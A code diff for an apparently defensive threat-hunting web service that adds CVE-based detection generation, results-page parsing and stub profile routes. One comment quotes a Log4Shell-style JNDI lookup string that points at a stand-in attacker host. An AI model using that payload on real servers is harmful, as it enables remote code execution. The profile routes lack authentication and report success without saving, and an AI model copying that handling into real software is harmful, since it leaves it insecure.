@@ -1,5 +1,5 @@
 from fastapi import FastAPI, Form, Request, UploadFile, File
-from fastapi.responses import HTMLResponse
+from fastapi.responses import HTMLResponse, FileResponse
 from fastapi.templating import Jinja2Templates
 from archer.security import sanitize_filename, sanitize_path_component, validate_safe_path, sanitize_group_name
 from fastapi.staticfiles import StaticFiles
@@ -36,6 +36,22 @@ templates = Jinja2Templates(directory="templates")
 
 app = FastAPI(title="Archer Threat Hunting Service")
 app.mount("/static", StaticFiles(directory="static"), name="static")
+
+# Favicon route - ensure favicon is served from root with no-cache headers
+@app.get("/favicon.ico", include_in_schema=False)
+async def favicon():
+    favicon_path = Path("static/favicon-32.png")
+    if favicon_path.exists():
+        return FileResponse(
+            favicon_path,
+            media_type="image/png",
+            headers={
+                "Cache-Control": "no-cache, no-store, must-revalidate",
+                "Pragma": "no-cache",
+                "Expires": "0"
+            }
+        )
+    return HTMLResponse(status_code=404)
 
 # Resetting latest.yaml to blank on startup
 with open(os.path.join("data", "generate", "latest.yaml"), "w") as latest_yaml:
@@ -293,14 +309,296 @@ async def generate(
         return JSONResponse({"redirect_url": f"/manual?group_name={group_name}"})
 
 
+@app.post("/generate/cve")
+async def generate_cve(
+    request: Request,
+    cve_id: str = Form(...),
+    run_correlation: str = Form(None),
+    semantic: str = Form(None),
+    advanced_parsing: str = Form(None),
+    ai_generators: str = Form(None),
+    local_llm: str = Form(None)
+):
+    """Generate detection queries for CVE(s)."""
+    import re
+    from archer.intelligence.cve_hunter import research_and_hunt
+
+    # Support multiple CVEs (comma-separated)
+    cve_ids = [c.strip().upper() for c in cve_id.split(',') if c.strip()]
+
+    if not cve_ids:
+        return JSONResponse({"error": "No CVE IDs provided"}, status_code=400)
+
+    # Validate CVE format: CVE-20XX-NNNN (must start with CVE-20, year 2000+)
+    cve_pattern = re.compile(r'^CVE-20\d{2}-\d{4,}$', re.IGNORECASE)
+    invalid_cves = [cve for cve in cve_ids if not cve_pattern.match(cve)]
+
+    if invalid_cves:
+        return JSONResponse({
+            "error": f"Invalid CVE format: {', '.join(invalid_cves)}. CVE IDs must follow format: CVE-20XX-NNNN (e.g., CVE-2021-44228)"
+        }, status_code=400)
+
+    # Use CVE ID directly as group name (no CVE_ prefix since it already starts with CVE-)
+    if len(cve_ids) == 1:
+        group_name = cve_ids[0]  # e.g., "CVE-2021-44228"
+    else:
+        group_name = f"{cve_ids[0]}_plus_{len(cve_ids)-1}"  # e.g., "CVE-2021-44228_plus_2"
+
+    # Determine GENAI_MODE
+    genai_mode = None
+    if local_llm == "true":
+        genai_mode = "local_llm"
+    elif ai_generators == "true":
+        genai_mode = "ai_generators"
+    elif semantic == "true":
+        genai_mode = "semantic"
+    elif advanced_parsing == "true":
+        genai_mode = "advanced_parsing"
+
+    def _bg():
+        try:
+            print(f"========================================", flush=True)
+            print(f"CVE BACKGROUND THREAD STARTED", flush=True)
+            print(f"Group name: {group_name}", flush=True)
+            print(f"CVE IDs: {cve_ids}", flush=True)
+            print(f"========================================", flush=True)
+
+            write_progress(group_name, {
+                "status": "researching_cve",
+                "stage": "CVE Research",
+                "created_yaml": 0,
+                "total_yaml": len(cve_ids)
+            })
+
+            # Research each CVE
+            all_techniques = []
+            all_iocs = {"cmd": [], "file": [], "reg": [], "network": [], "hash": [], "ip": [], "domain": []}
+
+            for cve in cve_ids:
+                print(f"Researching {cve}...")
+                research = research_and_hunt(cve)
+
+                # Collect techniques
+                all_techniques.extend(research.get("techniques", []))
+
+                # Collect IOCs
+                for ioc_type in all_iocs:
+                    all_iocs[ioc_type].extend(research.get("iocs", {}).get(ioc_type, []))
+
+            # Deduplicate
+            all_techniques = list(set(all_techniques))
+            for ioc_type in all_iocs:
+                all_iocs[ioc_type] = list(set(all_iocs[ioc_type]))
+
+            print(f"Found {len(all_techniques)} unique techniques from {len(cve_ids)} CVE(s)")
+            print(f"DEBUG: Techniques list: {all_techniques}")
+            print(f"DEBUG: IOCs collected: {sum(len(v) for v in all_iocs.values())} total")
+
+            # Build IOC guidance from collected IOCs
+            ioc_guidance = []
+            for ioc_type, values in all_iocs.items():
+                if values:
+                    ioc_guidance.append(f"{ioc_type}: {', '.join(values[:5])}")  # Limit to 5 per type
+            ioc_detect_guidance = "; ".join(ioc_guidance) if ioc_guidance else ""
+
+            # CVE-based detection generation strategy:
+            # Even if no ATT&CK techniques are found, we can still generate detections
+            # based on CVE behavior, IOCs, and vulnerability characteristics
+
+            if not all_techniques:
+                print("INFO: No ATT&CK techniques mapped (CVE may be too new or not in ATT&CK)")
+                print("INFO: Generating CVE-specific detections based on vulnerability behavior")
+
+                # Use CVE metadata to build detections
+                # Create a synthetic "technique" that represents this CVE
+                synthetic_techniques = []
+                for cve in cve_ids:
+                    synthetic_techniques.append(f"CVE-{cve.split('-')[1]}-{cve.split('-')[2]}")
+                all_techniques = synthetic_techniques
+                print(f"INFO: Created synthetic technique identifiers: {all_techniques}")
+
+            # Group techniques by tactic using _get_technique_info
+            tactic_map = {}
+            for tech_id in all_techniques:
+                try:
+                    # Check if this is an ATT&CK technique ID or synthetic CVE technique
+                    if tech_id.startswith("T") and tech_id[1:].split('.')[0].isdigit():
+                        # Real ATT&CK technique - try to get info
+                        print(f"DEBUG: Getting ATT&CK info for {tech_id}")
+                        tech_info = _get_technique_info(tech_id)
+                        if tech_info:
+                            tactic = tech_info.get("tactic", "CVE Exploitation")
+                            print(f"DEBUG: {tech_id} → {tactic}")
+                        else:
+                            tactic = "CVE Exploitation"
+                            print(f"DEBUG: {tech_id} → CVE Exploitation (no ATT&CK mapping)")
+                    else:
+                        # Synthetic CVE-based technique
+                        tactic = "CVE Exploitation"
+                        print(f"DEBUG: {tech_id} → CVE Exploitation (synthetic)")
+
+                    if tactic not in tactic_map:
+                        tactic_map[tactic] = []
+
+                    # Build comprehensive detection guidance with IOCs
+                    ioc_details = []
+                    if all_iocs.get("cmd"):
+                        ioc_details.append(f"Commands/Patterns: {', '.join(all_iocs['cmd'][:3])}")
+                    if all_iocs.get("file"):
+                        ioc_details.append(f"Files: {', '.join(all_iocs['file'][:3])}")
+                    if all_iocs.get("network"):
+                        ioc_details.append(f"Network: {', '.join(all_iocs['network'][:3])}")
+
+                    comprehensive_guidance = f"Exploitation of {', '.join(cve_ids)}. "
+                    if ioc_details:
+                        comprehensive_guidance += "Key indicators: " + "; ".join(ioc_details)
+                    else:
+                        comprehensive_guidance += "Monitor for CVE-specific indicators and exploit patterns."
+
+                    # Build IOC dictionary for detection engine
+                    # The detection engine expects types: cmd, reg, evt, sw, network
+                    # Map CVE IOC types to detection engine types
+                    ioc_type_mapping = {
+                        "cmd": "cmd",          # Commands stay as cmd
+                        "file": "sw",          # Files map to software
+                        "network": "network",  # Network protocols (ldap://, rmi://, ldaps://) get network category
+                        "reg": "reg",          # Registry stays as reg
+                        "hash": "sw",          # Hashes map to software
+                        "ip": "network",       # IPs map to network
+                        "domain": "network"    # Domains map to network
+                    }
+
+                    ioc_dict = {}
+                    for ioc_type, values in all_iocs.items():
+                        if values and ioc_type in ioc_type_mapping:
+                            mapped_type = ioc_type_mapping[ioc_type]
+                            # Merge into existing mapped type or create new
+                            if mapped_type not in ioc_dict:
+                                ioc_dict[mapped_type] = []
+                            ioc_dict[mapped_type].extend(values[:10])  # Limit to 10 per original type
+
+                            # Network protocols (ldap://, rmi://, ldaps://) also go into cmd category
+                            # since they appear in commands like ${jndi:ldap://attacker.com}
+                            if ioc_type == "network":
+                                if "cmd" not in ioc_dict:
+                                    ioc_dict["cmd"] = []
+                                ioc_dict["cmd"].extend(values[:10])
+
+                    # DEBUG: Log the IOC dict structure before adding to tactic_map
+                    print(f"DEBUG [app.py]: Built ioc_dict for {tech_id}:")
+                    print(f"  - ioc_dict keys: {list(ioc_dict.keys())}")
+                    for key, vals in ioc_dict.items():
+                        print(f"  - {key}: type={type(vals)}, count={len(vals) if isinstance(vals, list) else 'N/A'}")
+
+                    # Get platforms for this technique (required for platform validation)
+                    tech_platforms = []
+                    if tech_info and "platforms" in tech_info:
+                        tech_platforms = tech_info["platforms"]
+                    elif tech_id.startswith("T"):
+                        # For real ATT&CK techniques without info, try fetching again
+                        tech_info_retry = _get_technique_info(tech_id)
+                        if tech_info_retry and "platforms" in tech_info_retry:
+                            tech_platforms = tech_info_retry["platforms"]
+
+                    # For CVE techniques or techniques with no platform data, use universal platforms
+                    if not tech_platforms:
+                        tech_platforms = ["Windows", "Linux", "macOS", "Containers"]
+
+                    tactic_map[tactic].append({
+                        "technique": tech_id,
+                        "op_guidance": ioc_dict if ioc_dict else comprehensive_guidance,
+                        "red_tool": {},
+                        "detect_guidance": ioc_detect_guidance if ioc_detect_guidance else comprehensive_guidance,
+                        "iocs": all_iocs,  # Pass full IOCs for reference
+                        "procedure_platforms": tech_platforms,  # CRITICAL: Add platforms for validation
+                        "software_platforms": {}  # Empty dict for software (not used in CVE detection)
+                    })
+                except Exception as e:
+                    print(f"Warning: Could not process technique {tech_id}: {e}")
+                    import traceback
+                    traceback.print_exc()
+                    # Add to CVE Exploitation tactic
+                    if "CVE Exploitation" not in tactic_map:
+                        tactic_map["CVE Exploitation"] = []
+                    tactic_map["CVE Exploitation"].append({
+                        "technique": tech_id,
+                        "op_guidance": f"Exploitation of {', '.join(cve_ids)}",
+                        "red_tool": "",
+                        "detect_guidance": ioc_detect_guidance
+                    })
+
+            # Build manual_data in the format process_group expects
+            manual_data = []
+            for tactic, techniques in tactic_map.items():
+                manual_data.append({
+                    "tactic": tactic,
+                    "techniques": techniques
+                })
+
+            print(f"DEBUG: Built manual_data with {len(manual_data)} tactics")
+            for entry in manual_data:
+                print(f"  - Tactic: {entry['tactic']}, Techniques: {len(entry['techniques'])}")
+
+            if not manual_data:
+                print(f"ERROR: Failed to build manual_data even with fallbacks!")
+                print(f"  - CVE IDs: {cve_ids}")
+                print(f"  - Techniques: {all_techniques}")
+                print(f"  - IOCs: {all_iocs}")
+                raise ValueError(f"CVE research failed to build detection data")
+
+            # Process using existing pipeline
+            modified_process_group_wrapper(
+                group_name,
+                hypothesis=f"CVE Hunting: {', '.join(cve_ids)}",
+                manual_data=manual_data,
+                genai_mode=genai_mode,
+                run_correlation=(run_correlation == "true")
+            )
+
+        except Exception as e:
+            print(f"CVE generation error: {e}", flush=True)
+            import traceback
+            traceback.print_exc()
+            import sys
+            sys.stderr.flush()
+            sys.stdout.flush()
+            try:
+                write_progress(group_name, {"status": "failed", "error": str(e)})
+            except Exception:
+                pass
+
+    threading.Thread(target=_bg, daemon=True).start()
+
+    # Initialize progress
+    try:
+        write_progress(group_name, {
+            "status": "started",
+            "stage": "CVE Research",
+            "created_yaml": 0,
+            "cve_ids": cve_ids
+        })
+    except Exception:
+        pass
+
+    return JSONResponse({"redirect_url": f"/progress?group_name={group_name}"})
+
+
 # Progress page endpoint
 @app.get("/progress", response_class=HTMLResponse)
 async def progress(request: Request, group_name: str = ""):
     # Simple progress page shown while the orchestrator runs. Currently
     # the template only needs the request and the group_name to display.
+
+    # Detect if this is a CVE hunt to set initial page state
+    is_cve_hunt = group_name and (group_name.upper().startswith('CVE-'))
+
     return templates.TemplateResponse(
         "progress.html",
-        {"request": request, "group_name": group_name},
+        {
+            "request": request,
+            "group_name": group_name,
+            "is_cve_hunt": is_cve_hunt
+        },
     )
 
 
@@ -758,7 +1056,23 @@ def modified_process_group_wrapper(
 
     try:
         # Call the original process_group with run_correlation parameter
-        process_group(group_name, hypothesis, manual_data, run_correlation=run_correlation)
+        # IMPORTANT: Use named parameters to avoid positional argument mismatch
+        print(f"DEBUG: About to call process_group with:")
+        print(f"  - group_name: {group_name}")
+        print(f"  - output_dir: None")
+        print(f"  - hypothesis: {hypothesis}")
+        print(f"  - manual_data: {manual_data is not None} (is not None)")
+        print(f"  - run_correlation: {run_correlation}")
+
+        process_group(
+            group_name=group_name,
+            output_dir=None,
+            hypothesis=hypothesis,
+            manual_data=manual_data,
+            run_correlation=run_correlation
+        )
+
+        print(f"DEBUG: process_group completed successfully")
 
         # If correlation was requested and run via process_group, we're done
         if run_correlation:
@@ -1725,83 +2039,291 @@ def results_page(request: Request, group_name: str):
     }
 
     # Find all YAML files for this group
+    # For CVE groups, files are named by technique (T1059, T1190) not group name
+    # For threat actor groups, files are named by tactic but tagged with group name
     if os.path.exists(generate_dir):
-        for yaml_file in glob.glob(os.path.join(generate_dir, f"{safe_group}_*.yaml")):
+        # Try both group name pattern and wildcard pattern for CVEs
+        pattern1 = os.path.join(generate_dir, f"{safe_group}_*.yaml")
+        pattern2 = os.path.join(generate_dir, "T*_*.yaml") if safe_group.upper().startswith("CVE") else os.path.join(generate_dir, "*.yaml")
+
+        yaml_files = glob.glob(pattern1)
+        if not yaml_files and pattern2 != pattern1:
+            yaml_files = glob.glob(pattern2)
+            # Filter by checking tags inside YAML for threat actor groups
+            filtered_files = []
+            for yaml_file in yaml_files:
+                try:
+                    with open(yaml_file, 'r') as f:
+                        content = f.read()
+                        # Check if group name is in tags (e.g., "Scattered Spider (Group)")
+                        if f"{group_name} (Group)" in content or f"{safe_group} (Group)" in content:
+                            filtered_files.append(yaml_file)
+                except:
+                    pass
+            yaml_files = filtered_files if filtered_files else yaml_files
+
+        for yaml_file in yaml_files:
             filename = os.path.basename(yaml_file)
 
             # Determine vendor from filename
+            # MDE files: DeviceEvents, DeviceProcessEvents, etc.
+            # Splunk files: *.yaml (e.g., edr_events, linux_syslog, aws_cloudtrail)
             vendor = None
-            for v in vendor_icons.keys():
-                if f"_{v}_" in filename.lower() or f"_{v}." in filename.lower():
-                    vendor = v
-                    break
+
+            if filename.startswith("Device") or "_Device" in filename:
+                vendor = "mde"
+            elif filename.endswith("_prod.yaml"):
+                vendor = "splunk"
+            else:
+                # Fallback: check for vendor keywords
+                for v in vendor_icons.keys():
+                    if f"_{v}_" in filename.lower() or f"_{v}." in filename.lower():
+                        vendor = v
+                        break
 
             if not vendor:
-                vendor = "unknown"
+                vendor = "splunk"  # Default to Splunk instead of unknown
 
             if vendor not in detection_files:
                 detection_files[vendor] = []
 
             # Extract technique and title from filename
-            # Format: groupname_vendor_technique_description.yaml
-            parts = filename.replace(".yaml", "").split("_", 3)
-            technique = parts[2] if len(parts) > 2 else "Unknown"
-            title = parts[3].replace("_", " ").title() if len(parts) > 3 else filename
+            # Format: example_index.yaml or T1234_DeviceEvents.yaml
+            parts = filename.replace(".yaml", "").split("_")
 
-            # Read first few lines for description
+            # First part is always the technique (T1234)
+            technique = parts[0] if parts else "Unknown"
+
+            # Mapping for proper tool names
+            tool_name_map = {
+                "mcafee epo": "McAfee ePO",
+                "azure activitylog": "Azure Activity",
+                "azure activedirectory": "Entra ID",
+                "microsoft windows": "Windows Event Logs",
+                "aws directoryservicead": "AWS Directory Services",
+                "aws guardduty": "AWS GuardDuty",
+                "aws cloudtrail": "AWS CloudTrail",
+                "devicenetworkevents": "DeviceNetworkEvents",
+                "devicefileevents": "DeviceFileEvents",
+                "deviceimageloadevents": "DeviceImageLoadEvents",
+                "deviceevents": "DeviceEvents",
+                "deviceprocessevents": "DeviceProcessEvents",
+                "microsoft defender": "Microsoft Defender",
+                "unix": "Unix"
+            }
+
+            # For title, use everything after technique, cleaned up
+            if len(parts) > 1:
+                # Remove technique from parts
+                title_parts = parts[1:]
+                # Remove 'prod' if it's the last part
+                if title_parts and title_parts[-1].lower() == "prod":
+                    title_parts = title_parts[:-1]
+                # Join and clean up
+                raw_title = " ".join(title_parts).replace("_", " ").lower()
+
+                # Apply mapping
+                title = tool_name_map.get(raw_title, raw_title.title())
+            else:
+                title = filename
+
+            # Read description from YAML (handling multiline descriptions)
             description = ""
             try:
                 with open(yaml_file, 'r') as f:
-                    lines = f.readlines()[:10]
-                    for line in lines:
+                    lines = f.readlines()
+                    in_description = False
+                    desc_lines = []
+
+                    for i, line in enumerate(lines):
+                        # Found description field
                         if line.strip().startswith("description:"):
-                            description = line.split(":", 1)[1].strip().strip('"\'')
-                            break
+                            content = line.split(":", 1)[1].strip()
+                            # If it's a multiline indicator (| or >)
+                            if content in ('|', '>'):
+                                in_description = True
+                                continue
+                            # If content is on the same line
+                            elif content:
+                                description = content.strip('"\'')
+                                break
+                        # Collect multiline description content
+                        elif in_description:
+                            # Stop if we hit a non-indented line or another field
+                            if line.strip() and not line.startswith(' '):
+                                break
+                            # Add the line (strip leading spaces)
+                            if line.strip():
+                                desc_lines.append(line.strip())
+
+                    # Join collected lines and format with newlines between indicator types
+                    if desc_lines:
+                        raw_desc = ' '.join(desc_lines)
+                        # Replace "; " with newlines to separate indicator types
+                        formatted_desc = raw_desc.replace('; ', '\n')
+                        # Limit total length
+                        if len(formatted_desc) > 300:
+                            formatted_desc = formatted_desc[:300] + '...'
+                        description = formatted_desc
             except:
                 pass
+
+            # Get technique name from ATT&CK if available (only for actual technique IDs like T1234)
+            technique_name = ""
+            technique_upper = technique.upper()
+            if technique_upper.startswith('T') and hasattr(request.app.state, 'technique_descriptions'):
+                try:
+                    tech_desc = request.app.state.technique_descriptions.get(technique_upper, {})
+                    technique_name = tech_desc.get('name', '')
+                except:
+                    pass
+
+            # Format technique display as "T1234 - Technique Name" or just the tactic name
+            if technique_name:
+                technique_display = f"{technique_upper} - {technique_name}"
+            else:
+                # For tactic names (non-T#### format), just use the name as-is
+                technique_display = technique_upper if technique_upper.startswith('T') else technique
 
             detection_files[vendor].append({
                 "file": filename,
                 "title": title,
                 "technique": technique.upper(),
+                "technique_display": technique_display,
                 "description": description or f"Detection rule for {technique}"
             })
 
-    # Build vendor list for template
+    # Build vendor list for template with grouping
+    # Group detections by technique + description (same technique + same IOCs = group together)
     detections = []
     total_detections = 0
+
     for vendor, files in detection_files.items():
+        # Group files by technique + description
+        grouped = {}
+        for file_data in files:
+            key = (file_data['technique'], file_data['description'])
+            if key not in grouped:
+                grouped[key] = {
+                    "technique": file_data['technique'],
+                    "technique_display": file_data.get('technique_display', file_data['technique']),
+                    "titles": [],
+                    "description": file_data['description']
+                }
+            grouped[key]['titles'].append(file_data['title'])
+            total_detections += 1  # Count every detection individually
+
+        # Convert grouped data to list format
+        detection_list = []
+        for (technique, description), data in sorted(grouped.items(), key=lambda x: x[0][0]):
+            # Sort titles alphabetically and join with commas
+            sorted_titles = sorted(data['titles'])
+            combined_title = ", ".join(sorted_titles)
+            detection_list.append({
+                "technique": data['technique_display'],  # Use full display name
+                "title": combined_title,
+                "description": description
+            })
+
         detections.append({
             "name": vendor,
             "display_name": vendor_display_names.get(vendor, vendor.title()),
             "icon": vendor_icons.get(vendor, "📋"),
-            "count": len(files),
-            "detections": sorted(files, key=lambda x: x['technique'])
+            "count": len(files),  # Original count for display
+            "detections": detection_list
         })
-        total_detections += len(files)
+
+    # Add Elastic as "Coming Soon" placeholder
+    detections.append({
+        "name": "elastic",
+        "display_name": "Elastic",
+        "icon": "🔎",
+        "count": 0,
+        "detections": [],
+        "coming_soon": True
+    })
 
     detections.sort(key=lambda x: x['count'], reverse=True)
 
     # Load correlations
     correlations = []
+    # Try both sanitized name (with underscores) and original name (with spaces)
     correlation_file = os.path.join("data", "correlate", f"{safe_group}.json")
+    if not os.path.exists(correlation_file):
+        # Try with spaces instead of underscores
+        correlation_file = os.path.join("data", "correlate", f"{group_name}.json")
+
     if os.path.exists(correlation_file):
         try:
+            import re
             with open(correlation_file, 'r') as f:
                 corr_data = json.load(f)
-                for idx, corr in enumerate(corr_data.get("correlations", [])):
-                    techniques = []
-                    for tech in corr.get("techniques", []):
-                        tech_id = tech if isinstance(tech, str) else tech.get("id", "Unknown")
-                        tech_name = tech.get("name", "") if isinstance(tech, dict) else ""
-                        techniques.append({"id": tech_id, "name": tech_name or tech_id})
+                # The file uses "vendor_correlations" not "correlations"
+                vendor_corrs = corr_data.get("vendor_correlations", [])
 
-                    correlations.append({
-                        "techniques": techniques,
-                        "description": corr.get("description", "Multi-stage attack sequence"),
-                        "flow_file": f"{safe_group}_corr_{idx+1}.html"
-                    })
-        except:
+                # Extract technique and data source information from filenames
+                for idx, corr in enumerate(vendor_corrs):
+                    vendor = corr.get("vendor", "unknown")
+                    file_a = corr.get("a", "")
+                    file_b = corr.get("b", "")
+
+                    # Parse filename format: "example_index.yaml"
+                    # Example: "Multi-FactorAuthentication_edr_events.yaml"
+                    techniques = []
+
+                    for file_path in [file_a, file_b]:
+                        if file_path:
+                            filename = os.path.basename(file_path).replace(".yaml", "")
+                            # Split by underscore: ["Multi-FactorAuthentication", "microsoft", "defender", "prod"]
+                            parts = filename.split("_")
+
+                            if len(parts) >= 2:
+                                # First part is the technique name
+                                technique_name = parts[0].replace("-", " ")
+
+                                # Remaining parts (except last 'prod') form the data source
+                                # Join all middle parts: ["microsoft", "defender"] → "microsoft_defender"
+                                data_source_parts = parts[1:-1] if parts[-1] == "prod" else parts[1:]
+                                data_source = "_".join(data_source_parts)
+
+                                # Map data source to friendly name
+                                source_map = {
+                                    "microsoft_defender": "Microsoft Defender",
+                                    "microsoft_windows": "Windows Event Logs",
+                                    "azure_activitylog": "Azure Activity",
+                                    "azure_activedirectory": "Entra ID",
+                                    "aws_directoryservicead": "AWS Directory Services",
+                                    "aws_cloudtrail": "AWS CloudTrail",
+                                    "aws_guardduty": "AWS GuardDuty",
+                                    "mcafee_epo": "McAfee ePO",
+                                    "unix": "Unix",
+                                    "deviceprocessevents": "DeviceProcessEvents",
+                                    "devicefileevents": "DeviceFileEvents",
+                                    "devicenetworkevents": "DeviceNetworkEvents",
+                                    "deviceevents": "DeviceEvents",
+                                    "deviceimageloadevents": "DeviceImageLoadEvents"
+                                }
+
+                                friendly_source = source_map.get(data_source, data_source.replace("_", " ").title())
+
+                                techniques.append({
+                                    "id": technique_name,
+                                    "name": technique_name,
+                                    "source": friendly_source
+                                })
+
+                    if len(techniques) >= 2:
+                        # Create description showing technique + source for each step
+                        desc = f"{vendor.title()} correlation: {techniques[0]['name']} ({techniques[0]['source']}) → {techniques[1]['name']} ({techniques[1]['source']})"
+
+                        correlations.append({
+                            "techniques": techniques,
+                            "description": desc,
+                            "flow_file": f"{safe_group}_corr_{idx+1}.html",
+                            "vendor": vendor
+                        })
+        except Exception as e:
+            print(f"Error loading correlations: {e}")
             pass
 
     # Check if attack flow exists
@@ -1828,9 +2350,16 @@ def results_page(request: Request, group_name: str):
 
     # Get MITRE ID if available
     mitre_id = None
-    if check_group_in_mitre(safe_group):
-        # Try to find MITRE ID from STIX data
-        mitre_id = safe_group  # Simplified
+    # For CVE groups, skip MITRE check (they won't be in MITRE groups)
+    if not safe_group.upper().startswith("CVE-"):
+        try:
+            from archer.mitre.enterprise import get_stix_data
+            bundle = get_stix_data("https://raw.githubusercontent.com/mitre-attack/attack-stix-data/master/enterprise-attack/enterprise-attack.json")
+            if check_group_in_mitre(bundle, safe_group):
+                # Try to find MITRE ID from STIX data
+                mitre_id = safe_group  # Simplified
+        except:
+            pass
 
     return templates.TemplateResponse(
         "results.html",
@@ -1961,3 +2490,105 @@ def download_attack_flow(filename: str):
         media_type="application/json",
         filename=safe_filename
     )
+
+
+# ============================================================================
+# Profile Management Routes
+# ============================================================================
+
+@app.get("/profile", response_class=HTMLResponse)
+async def profile_page(request: Request):
+    """
+    Render the profile page with user information and settings.
+    """
+    # TODO: Add authentication check here
+    # For now, we'll render with empty user data
+    return templates.TemplateResponse(
+        "profile.html",
+        {
+            "request": request,
+            "user": None,  # Will be populated from session/database
+            "profile_picture_url": None
+        }
+    )
+
+
+@app.post("/api/profile")
+async def update_profile(request: Request):
+    """
+    Update user profile information.
+    """
+    # TODO: Add authentication check
+    data = await request.json()
+
+    # TODO: Save to database
+    # For now, return success
+    return {"success": True, "message": "Profile updated successfully"}
+
+
+@app.post("/api/profile/picture")
+async def upload_profile_picture(profile_picture: UploadFile = File(...)):
+    """
+    Upload and save user profile picture.
+    """
+    # TODO: Add authentication check
+
+    # Validate file type
+    if not profile_picture.content_type.startswith("image/"):
+        return {"success": False, "error": "File must be an image"}
+
+    # Create profile pictures directory if it doesn't exist
+    pics_dir = os.path.join("data", "profile_pictures")
+    os.makedirs(pics_dir, exist_ok=True)
+
+    # Generate unique filename
+    file_ext = os.path.splitext(profile_picture.filename)[1]
+    filename = f"user_profile{file_ext}"  # TODO: Use user ID
+    file_path = os.path.join(pics_dir, filename)
+
+    # Save file
+    with open(file_path, "wb") as f:
+        content = await profile_picture.read()
+        f.write(content)
+
+    return {
+        "success": True,
+        "url": f"/static/profile_pictures/{filename}"
+    }
+
+
+@app.get("/api/profile/timeline")
+async def get_timeline(request: Request):
+    """
+    Get user's historical activity timeline.
+    """
+    # TODO: Add authentication check
+    # TODO: Query database for user's activity
+
+    # For now, return empty timeline
+    return {"timeline": []}
+
+
+@app.get("/api/profile/apikeys")
+async def get_api_keys(request: Request):
+    """
+    Get user's API keys (masked for security).
+    """
+    # TODO: Add authentication check
+    # TODO: Load from secure storage
+
+    # For now, return empty
+    return {}
+
+
+@app.post("/api/profile/apikeys")
+async def save_api_keys(request: Request):
+    """
+    Save user's API keys securely.
+    """
+    # TODO: Add authentication check
+    data = await request.json()
+
+    # TODO: Encrypt and save to secure storage
+
+    return {"success": True, "message": "API keys saved successfully"}
